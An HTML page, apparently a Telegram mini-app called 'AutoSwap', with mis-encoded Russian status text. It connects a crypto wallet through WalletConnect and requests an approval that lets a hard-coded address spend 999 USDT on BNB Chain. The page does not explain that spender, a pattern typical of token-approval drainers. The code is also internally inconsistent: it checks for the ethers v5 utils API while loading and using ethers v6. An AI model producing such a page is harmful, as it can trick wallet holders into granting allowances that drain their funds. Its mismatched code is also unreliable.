<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>AutoSwap ‚Äî Approve USDT</title>
  <style>
    body { font-family:'Segoe UI',sans-serif; background:linear-gradient(135deg,#1a1f2d,#0d1520); color:#e0e0e0; text-align:center; margin:0; padding:20px;}
    .container { max-width:500px; margin:0 auto; padding:30px; background:rgba(30,40,55,0.8); border-radius:20px; box-shadow:0 10px 40px rgba(0,0,0,0.4); }
    canvas { display:block; margin:20px auto; }
    #status { margin-top:20px; font-size:16px; white-space:pre-wrap; }
  </style>
</head>
<body>
  <div class="container">
    <h1>üîÑ AutoSwap ‚Äî approve USDT</h1>
    <canvas id="qrcode"></canvas>
    <div id="status">–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...</div>
  </div>

  <!-- –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫ -->
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>

  <script type="module">
    import SignClient from 'https://esm.sh/@walletconnect/sign-client@2.13.1';

    async function runApp() {
      // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ ethers –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω
      if (!window.ethers || !window.ethers.utils) {
        document.getElementById('status').textContent = '‚ùå –û—à–∏–±–∫–∞: ethers.js –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω –∏–ª–∏ —É—Å—Ç–∞—Ä–µ–ª';
        return;
      }
      const ethers = window.ethers;
      const { Interface } = ethers.utils;

      const setStatus = (msg, color = "#4fc3f7") => {
        const el = document.getElementById("status");
        el.textContent = msg;
        el.style.color = color;
      };

      try {
        setStatus("üîå –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è WalletConnect...");
        const client = await SignClient.init({
          projectId: "d868f90cd734355ae0320f8f0258b6b1",
          relayUrl: "wss://relay.walletconnect.com",
          metadata: {
            name: "AutoSwap Approve Flow",
            description: "Approve USDT ‚Üí AutoSwap",
            url: location.href,
            icons: ["https://walletconnect.com/favicon.ico"]
          }
        });

        setStatus("üì∑ –û–∂–∏–¥–∞–Ω–∏–µ QR‚Äë–∫–æ–¥–∞...");
        const { uri, approval } = await client.connect({
          requiredNamespaces: {
            eip155: {
              chains: ["eip155:56"],
              methods: ["eth_sendTransaction"],
              events: ["chainChanged", "accountsChanged"]
            }
          }
        });

        if (uri) {
          QRCode.toCanvas(document.getElementById("qrcode"), uri, { width: 240, margin: 1 });
          setStatus("üì± –û—Ç—Å–∫–∞–Ω–∏—Ä—É–π—Ç–µ QR‚Äë–∫–æ–¥ –≤ –∫–æ—à–µ–ª—å–∫–µ");
        }

        const session = await approval();
        const address = session.namespaces.eip155.accounts[0].split(":")[2];
        setStatus(`‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω–æ: ${address}`, "#66bb6a");

        const amount = ethers.parseUnits("999", 18);
        const usdt = ethers.getAddress("0x55d398326f99059ff775485246999027b3197955");
        const autoswap = ethers.getAddress("0x026c54b156b501ad9cea422e59454d4b6d6f6963");

        setStatus("‚úçÔ∏è –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ approve —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...");
        const approveIface = new Interface(["function approve(address,uint256)"]);
        const data = approveIface.encodeFunctionData("approve", [autoswap, amount]);

        setStatus("üöÄ –û—Ç–ø—Ä–∞–≤–∫–∞ approve...");
        const txHash = await client.request({
          topic: session.topic,
          chainId: "eip155:56",
          request: {
            method: "eth_sendTransaction",
            params: [{ from: address, to: usdt, data }]
          }
        });

        setStatus(`‚úÖ Approve –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω:\n${txHash}`, "#66bb6a");
      } catch (e) {
        console.error(e);
        setStatus(`‚ùå –û—à–∏–±–∫–∞: ${e.message || e.reason}`, "#ff6b6b");
      }
    }

    runApp();
  </script>
</body>
</html>
